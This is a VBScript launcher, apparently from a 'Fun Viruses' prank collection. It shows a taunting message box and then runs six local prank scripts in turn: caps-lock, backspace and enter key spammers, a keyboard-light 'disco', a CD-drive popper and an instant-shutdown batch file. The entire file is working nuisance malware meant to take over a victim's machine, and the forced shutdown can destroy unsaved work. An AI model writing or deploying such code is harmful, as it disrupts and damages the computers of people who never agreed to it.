ControlBox = False
MsgBox "Too late to stop me now! Try clicking the 'X' button!", vbOKOnly
Dim capSpammer
Dim keyDisco
Dim backSpammer
Dim enterSpammer
Dim drivePopper
Dim instaShutdown
capSpammer =  Chr(34) & "C:\Users\Odessa\Downloads\Fun Viruses\Viruses\Caps Spammer\virus.vbs" & Chr(34)
keyDisco =  Chr(34) & "C:\Users\Odessa\Downloads\Fun Viruses\Viruses\Disco\virus.vbs" & Chr(34)
backSpammer =  Chr(34) & "C:\Users\Odessa\Downloads\Fun Viruses\Viruses\Backspace Spammer\virus.vbs" & Chr(34)
enterSpammer =  Chr(34) & "C:\Users\Odessa\Downloads\Fun Viruses\Viruses\Enter Spammer\virus.vbs" & Chr(34)
drivePopper =  Chr(34) & "C:\Users\Odessa\Downloads\Fun Viruses\Viruses\CD Drive Popper\virus.vbs" & Chr(34)
instaShutdown =  Chr(34) & "C:\Users\Odessa\Downloads\Fun Viruses\Viruses\Shutdown\virus.bat" & Chr(34)

Set WSHShell = CreateObject("WScript.Shell")
WSHShell.Run "wscript " & capSpammer, , True
WSHShell.Run "wscript " & keyDisco, , True
WSHShell.Run "wscript " & backSpammer, , True
WSHShell.Run "wscript " & enterSpammer, , True
WSHShell.Run "wscript " & drivePopper, , True
WSHShell.Run "wscript " & instaShutdown, , True
